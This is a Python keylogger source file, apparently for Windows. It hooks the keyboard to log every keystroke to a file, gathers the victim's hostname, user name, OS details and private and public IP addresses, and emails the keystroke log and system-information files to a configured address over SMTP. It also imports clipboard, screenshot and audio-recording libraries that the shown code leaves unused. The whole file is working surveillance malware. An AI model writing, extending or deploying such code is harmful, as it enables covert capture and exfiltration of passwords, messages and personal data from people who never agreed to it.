#!/usr/bin/env/ python3

# Import libraries

# E-mail libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Standard system libraries to gather info

import socket
import platform
import time

import time
import os

from multiprocessing import Process, freeze_support

# Clipboard library
import win32clipboard

# Keyboard library
from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
from PIL import ImageGrab

# Import confiparser
from configparser import ConfigParser
from keylogger.config import Config

config = Config()
config = config.load()

count = 0
keys = []  # Empty list to append keys to


def __get_timestamp__():
    """

    Returns a local timestamp when called.

    Note:
        This is not future-proof

    Returns:
        str: A string containing the local time, formatted.

    """
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)

    return current_time


def send_email(filename, attachment, to_addr):
    """

    Send an email out to the specified address, with the specified file attached.

    Args:
        filename (str): The name of the file you wish to attach to the outgoing email.

        attachment (str): A string containing the absolute filepath to the file that you wish to attach to this
        outgoing email

        to_addr (str): A string containing the e-mail address to which you'd like the resulting email sent to.

    Returns:
        None

    """
    global config  # Config object loaded at module level

    # Grab some of our needed parameters from our config file.
    from_addr = config.get('SENDMAIL.PARTIES', 'from')
    from_usr = config.get('SENDMAIL.AUTH', 'login')
    usr_passwd = config.get('SENDMAIL.AUTH', 'password')
    host = config.get('SENDMAIL.SERVER', 'host')
    port = config.getint('SENDMAIL.SERVER', 'port')

    # Prepare our message class
    msg = MIMEMultipart()

    # Fill it
    msg['From'] = from_addr  # From:
    msg['To'] = to_addr  # To:
    msg['Subject'] = 'Key Log File'  # E-Mail subject

    body = 'Body_of_the_mail'  # Placeholder for e-mail body text

    # Attach our sorry-excuse-for-a-body to the email object.
    msg.attach(MIMEText(body, 'plain'))

    # Be implicit about what filename we're gonna mean in a couple lines.
    filename = filename

    # Read the file at the path indicated in the 'attachment' argument as a bytestream
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    # Load our textfile payload
    p.set_payload((attachment).read())

    # Encode to Base64
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f'attachment: filename={filename}')

    # Attach our data to the attachment of the email constructor
    msg.attach(p)

    # Establish a connection with the SMTP server
    sesh = smtplib.SMTP(host, port)

    # Secure uplink to email server
    sesh.starttls()

    # Login over secure uplink
    sesh.login(from_usr, usr_passwd)

    # Evaluate our entire email object down to a string
    text = msg.as_string()

    # Finally; send the e-mail from the address indicated in this functions
    sesh.sendmail(from_addr, to_addr, text)

    sesh.quit()


send_email('keys.txt', config.get('FILES', 'key-store'), config.get('SENDMAIL.PARTIES', 'dest'))


# noinspection PyBroadException
def comp_info():
    """

    Gather system-related information and write it to a file.

    Returns:
        None

    """
    with open(config.get('FILES', 'sysinfo-store'), 'a') as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        public_ip = None
        try:
            public_ip = get('https://api.ipify.org').text
        except Exception:
            f.write('Could not get Public IP Address (probably a max-query throttling)')

        if public_ip is not None:
            ip_addr_str = f'Public IP Address: {public_ip}\n'

        ts_raw = f'Session Started: {__get_timestamp__()}'
        usr_raw = f'Current User: {os.getlogin()}'
        f_ts = '*** ' + ts_raw + ' ***\n'
        f_usr = '*** ' + usr_raw + ' ***\n'
        header = f_ts + f_usr

        f.write(header)
        f.write(ip_addr_str)
        f.write(f'Processor: {platform.processor()}\n')
        f.write(f'System: {platform.system()} {platform.version()}\n')
        f.write(f'Machine: {platform.machine()}\n')
        f.write(f'Hostname: {hostname}\n')
        f.write(f'Private IP: {ip_addr}\n\n{"*" * 10 }\n\n')


comp_info()
send_email('sysinfo.txt', config.get('FILES', 'sysinfo-store'), config.get('SENDMAIL.PARTIES', 'dest'))


def on_press(key):
    """

    When a key is pressed

    Args:
        key:

    Returns:

    """
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0  # Reset counter
        write_file(keys)  # Write keys
        keys = []  # Reset key list


def write_file(key_list):
    with open(config.get('FILES', 'key-store'), 'a') as f:
        for key in key_list:
            k = str(key).replace("'", '')
            if k.find('space') > 0:
                f.write('\n')
                f.close()

            elif k.find('Key') == -1:
                f.write(k)
                f.close()


def on_release(key):
    """

    A hook that says when a key (on the keyboard) is released, and it's found to have been the ESC key that was down
    we need to exit the loop.


    Args:
        key: The key that was released.

    Returns:
        None

    """
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()